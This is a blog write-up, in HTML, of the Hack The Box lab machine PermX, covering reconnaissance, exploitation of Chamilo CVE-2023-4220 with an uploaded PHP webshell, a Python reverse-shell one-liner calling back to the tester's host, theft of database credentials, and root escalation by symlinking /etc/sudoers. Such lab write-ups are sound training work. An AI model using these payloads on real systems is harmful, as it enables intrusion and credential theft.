@@ -1,0 +1,345 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><script src="/thecybersecurityblog/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=thecybersecurityblog/livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="noindex, nofollow">
+<title>Hack The Box: PermX | The Cyber Security Blog</title>
+<meta name="keywords" content="">
+<meta name="description" content="Let&rsquo;s scan the machine with nmap.
+# Command sudo nmap -sS -sV -sC -v -T4 10.10.11.23 # Output PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 e2:5c:5d:8c:47:3e:d8:72:f7:b4:80:03:49:86:6d:ef (ECDSA) |_ 256 1f:41:02:8e:6b:17:18:9c:a0:ac:54:23:e9:71:30:17 (ED25519) 80/tcp open http Apache httpd 2.4.52 Let&rsquo;s check the Http Server in browser. It seems then we try to access http://10.10.11.23:80/ we get redirected to http://permx.htb/, but the page doesn&rsquo;t load.">
+<meta name="author" content="">
+<link rel="canonical" href="http://localhost:1313/thecybersecurityblog/docs/htb_permx/">
+<link crossorigin="anonymous" href="/thecybersecurityblog/assets/css/stylesheet.79112176b8c2cef599ca604236706c81a7be13fe98e3c4f69d839f5f91e6a942.css" integrity="sha256-eREhdrjCzvWZymBCNnBsgae&#43;E/6Y48T2nYOfX5HmqUI=" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://localhost:1313/thecybersecurityblog/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/thecybersecurityblog/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/thecybersecurityblog/favicon-32x32.png">
+<link rel="apple-touch-icon" href="http://localhost:1313/thecybersecurityblog/apple-touch-icon.png">
+<link rel="mask-icon" href="http://localhost:1313/thecybersecurityblog/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="http://localhost:1313/thecybersecurityblog/docs/htb_permx/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,100..800;1,100..800&display=swap" rel="stylesheet">
+
+    <nav class="nav">
+        <div class="head-class">
+            <div class="logo">
+                <a href="http://localhost:1313/thecybersecurityblog/" accesskey="h" title="The Cyber Security Blog (Alt + H)">The Cyber Security Blog</a>
+                
+            </div>
+            <ul id="menu">
+                
+                <li>
+                    <a href="http://localhost:1313/thecybersecurityblog/" title="Home">
+                        <span>Home</span>
+                    </a>
+                </li>
+                
+                    <li>|</li>
+                
+                <li>
+                    <a href="http://localhost:1313/thecybersecurityblog/blog/" title="Blog">
+                        <span>Blog</span>
+                    </a>
+                </li>
+                
+                    <li>|</li>
+                
+                <li>
+                    <a href="http://localhost:1313/thecybersecurityblog/tags/" title="Tags">
+                        <span>Tags</span>
+                    </a>
+                </li>
+                
+                    <li>|</li>
+                
+                <li>
+                    <a href="http://localhost:1313/thecybersecurityblog/about/" title="About">
+                        <span>About</span>
+                    </a>
+                </li>
+                
+            </ul>
+        </div>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      Hack The Box: PermX
+    </h1>
+    <div class="post-meta"><span title='2024-11-08 13:43:52 +0200 EET'>08 Nov 2024</span>
+
+</div>
+  </header>
+  <div class="card-list" onclick="location.href='https:\/\/www.hackthebox.com\/achievement\/machine\/2124852\/613';" style="cursor: pointer;">
+    <article class="card">
+      <figure class="card-image">
+        <img class=card-image src="permx_cert.png" alt="Cert" />
+      </figure>
+      <div class="card-header">
+        <a href="https://www.hackthebox.com/achievement/machine/2124852/613">Owned PermX from Hack The Box</a>
+      </div>
+      <div class="card-content">
+         I have just gained ownership of Cap machine from Hack The Box
+      </div>
+      <div class="card-footer">
+        Hack The Box
+      </div>
+    </article>
+  </div> 
+  <div class="post-content"><p>Let&rsquo;s scan the machine with nmap.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Command</span>
+</span></span><span style="display:flex;"><span>sudo nmap -sS -sV -sC -v -T4 10.10.11.23
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Output</span>
+</span></span><span style="display:flex;"><span>PORT   STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssh-hostkey: 
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> e2:5c:5d:8c:47:3e:d8:72:f7:b4:80:03:49:86:6d:ef <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> 1f:41:02:8e:6b:17:18:9c:a0:ac:54:23:e9:71:30:17 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>80/tcp open  http    Apache httpd 2.4.52
+</span></span></code></pre></div><p>Let&rsquo;s check the Http Server in browser. It seems then we try to access <code>http://10.10.11.23:80/</code> we get redirected to <code>http://permx.htb/</code>, but the page doesn&rsquo;t load.</p>
+<p>The server is likely configured to respond to requests only when they&rsquo;re made to a specific domain (in this case, <code>permx.htb</code>) This setup is common in virtual hosting, where multiple domains may be hosted on the same server, but each needs to be accessed by its domain name for the server to serve the correct website.</p>
+<p>To access the website, we need to modify the <code>etc/hosts</code> file. This way the browser skips the DNS lookup (to resolve the Ip Address, <code>10.10.11.23</code>) and it directly gets us to the website.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo vim /etc/hosts
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Add this line</span>
+</span></span><span style="display:flex;"><span>10.10.11.14     permx.htb
+</span></span></code></pre></div><br>
+<p>Now the website can load properly.
+<img loading="lazy" src="lab1.png" alt="alt"  />
+</p>
+<p>By looking around, it doesn&rsquo;t to be anything interesting. Let&rsquo;s try directory enumeration with <code>gobuster</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gobuster dir -u http://perm.htb/ -w /usr/share/wordlists/dirb/big.txt
+</span></span></code></pre></div><p>But still the resulted pages are either restricted or not usefull.</p>
+<p>Proceed to enumerate subdomains with <code>ffuf</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u http://permx.htb/ -H <span style="color:#e6db74">&#34;Host: FUZZ.permx.htb&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># results</span>
+</span></span><span style="display:flex;"><span>/www
+</span></span><span style="display:flex;"><span>/lms
+</span></span></code></pre></div><p>The <code>/lms</code> subdomain is interesting, let&rsquo;s give it a try. Change again <code>/etc/hosts</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo vim /etc/hosts
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Modify</span>
+</span></span><span style="display:flex;"><span>10.10.11.14     lms.permx.htb
+</span></span></code></pre></div><p>The application running on <code>lms.permx.htb</code> is <code>Chamilo</code>.</p>
+<p><img loading="lazy" src="lab2.png" alt="alt"  />
+</p>
+<p>With <code>Ctrl+U</code> we can take a look at the source code of the page.</p>
+<p><img loading="lazy" src="lab3.png" alt="alt"  />
+</p>
+<p>These are endpoints we can check to gather more information about the application.</p>
+<p>After inspection at <code>http://lms.permx.htb/app/Migrations/Schema/</code> we can see two folders indicating some version, problably of <code>Chamilo</code>, so the current one is <code>1.11</code>.</p>
+<p><img loading="lazy" src="lab4.png" alt="alt"  />
+</p>
+<p>Let&rsquo;s search online in case there is any exploit for the specific version of <code>Chamilo</code> we can use.</p>
+<p>After searching at Google, we found a vulnerability, <code>CVE-2023-4220</code>.</p>
+<p><img loading="lazy" src="lab6.png" alt="alt"  />
+</p>
+<p>By exploiting this vulnerability we could obtain remote code execution. There is also an exploit in github.</p>
+<p><img loading="lazy" src="lab5.png" alt="alt"  />
+</p>
+<p>Clone the repository and run the <code>.sh</code> script according to the documentation.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># we will use this code as webshell (webshell.php)</span>
+</span></span><span style="display:flex;"><span>&lt;?php <span style="color:#66d9ef">if</span><span style="color:#f92672">(</span>isset<span style="color:#f92672">(</span>$_REQUEST<span style="color:#f92672">[</span><span style="color:#e6db74">&#34;cmd&#34;</span><span style="color:#f92672">])){</span> echo <span style="color:#e6db74">&#34;&lt;pre&gt;&#34;</span>; $cmd <span style="color:#f92672">=</span> <span style="color:#f92672">(</span>$_REQUEST<span style="color:#f92672">[</span><span style="color:#e6db74">&#34;cmd&#34;</span><span style="color:#f92672">])</span>; system<span style="color:#f92672">(</span>$cmd<span style="color:#f92672">)</span>; echo <span style="color:#e6db74">&#34;&lt;/pre&gt;&#34;</span>; die; <span style="color:#f92672">}</span>?&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># run the script according to the documentation</span>
+</span></span><span style="display:flex;"><span>./CVE-2023-4220.sh -f webshell.php -h http://lms.permx.htb/ -p <span style="color:#ae81ff">6464</span>
+</span></span></code></pre></div><p>Then file was uploaded and a listener has started at the port <code>6464</code>. Let&rsquo;s head to this url in the server <code>http://target.test/main/inc/lib/javascript/bigupload/files/</code> and run the <code>webshell.php</code> script.</p>
+<p>Then at the end of the url add this payload</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>?cmd<span style="color:#f92672">=</span>python3 -c <span style="color:#e6db74">&#39;import os,pty,socket;s=socket.socket();s.connect((&#34;10.10.14.77&#34;,6464));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(&#34;sh&#34;)&#39;</span>
+</span></span></code></pre></div><p>We connected to the server! Type <code>bash</code> to open a <code>/bin/bash</code> terminal.</p>
+<p><img loading="lazy" src="lab7.png" alt="alt"  />
+</p>
+<p>By the <code>id</code> command, we can see that we are <code>www-data</code> user and that we do not have sudo permissions or any capabilities that we can leverage to escalate our previlages. So let&rsquo;s try to find out more about the application configurations,  databases etc.</p>
+<p>By reading <code>Chamilo</code> docs, it seems that the configurations of the database connected to the application is at <code>config/configuration.php</code> file.</p>
+<p>Open this file, <code>/var/www/chamilo/app/config/configuration.php</code>.</p>
+<p><img loading="lazy" src="lab8.png" alt="alt"  />
+</p>
+<p>So we got the credentials for the database (<code>chamilo:03F6lY3uXAP2bkW8</code>), which according to <code>Chamilo</code> documentation should be either <code>MySql</code> or <code>MariaDB</code>. Let&rsquo;s try with <code>MySql</code> first.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>mysql -u chamilo -p
+</span></span></code></pre></div><p>We connected successfully to <code>mysql</code>, now let&rsquo;s choose the <code>chamilo</code> database and search tables for usefull information like credentials.</p>
+<p><img loading="lazy" src="lab9.png" alt="alt"  />
+</p>
+<p>From the <code>show tables</code> results, <code>user</code> table seems interesting. Let&rsquo;s retreive its information.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>MariaDB <span style="color:#f92672">[</span>chamilo<span style="color:#f92672">]</span>&gt; <span style="color:#66d9ef">select</span> * from user<span style="color:#ae81ff">\G</span>;
+</span></span></code></pre></div><p>Note: Add <code>\G</code> at the end of any command to display the results in a vertical format. This can make it easier to read when there are many tables or long table names.</p>
+<p><img loading="lazy" src="lab10.png" alt="alt"  />
+</p>
+<p>We can use <code>john</code> to crack this password hash (<a href="https://www.dcode.fr/cipher-identifier">dcode</a> identifies the encryption method as the <code>Crypt() Hashing Fuction</code>)</p>
+<p><img loading="lazy" src="lab11.png" alt="alt"  />
+</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># hash.txt content</span>
+</span></span><span style="display:flex;"><span>$2y$04$1Ddsofn9mOaa9cbPzk0m6euWcainR.ZT2ts96vRCKrN7CGCmmq4ra
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>john --format<span style="color:#f92672">=</span>bcrypt hash.txt --wordlist<span style="color:#f92672">=</span>/usr/share/wordlists/rockyou.txt
+</span></span></code></pre></div><p>But no result. Let&rsquo;s see what other users are available and if we can ssh to them with the password we logged in to the database.</p>
+<p><img loading="lazy" src="lab13.png" alt="alt"  />
+</p>
+<p>So we have the user, <code>mtz</code>.</p>
+<p><img loading="lazy" src="lab11.png" alt="alt"  />
+</p>
+<p>Great, we got a foothold to the machine. Now we have to gain root previlages. With the command <code>sudo -l</code> we found that we can execute as root the <code>/opt/acl.sh</code> file.</p>
+<p><img loading="lazy" src="lab14.png" alt="alt"  />
+</p>
+<p>We can use this script to give additional permissions to any file in the <code>/home/mtz</code> directory but with no <code>..</code>, meaning no path traversal is permitted.</p>
+<p><img loading="lazy" src="lab15.png" alt="alt"  />
+</p>
+<p>Let&rsquo;s try adding the user <code>mtz</code> to the sudoers file by using a symling (symbolic link). First we need to check if <code>setfacl</code> can change permissions though the symlink to the original file.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ln -s /etc/sudoers sudoers <span style="color:#75715e"># create the symlink</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># give read/write permissions to the symlink</span>
+</span></span><span style="display:flex;"><span>sudo /opt/acl.sh rw /home/mtz/sudoers
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># add mtz to the original sudoers file though the symlink</span>
+</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;mtz ALL=(ALL:ALL) NOPASSWD: ALL&#34;</span> &gt;&gt; /home/mtz/sudoers
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># now run bash as sudo to see if it worked</span>
+</span></span><span style="display:flex;"><span>sudo bash <span style="color:#75715e">#Success</span>
+</span></span></code></pre></div><p><img loading="lazy" src="lab16.png" alt="alt"  />
+</p>
+<p>We have gained successfully root previleges and the flag!</p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+    <span>&copy; 2024 <a href="http://localhost:1313/thecybersecurityblog/">The Cyber Security Blog</a></span>
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
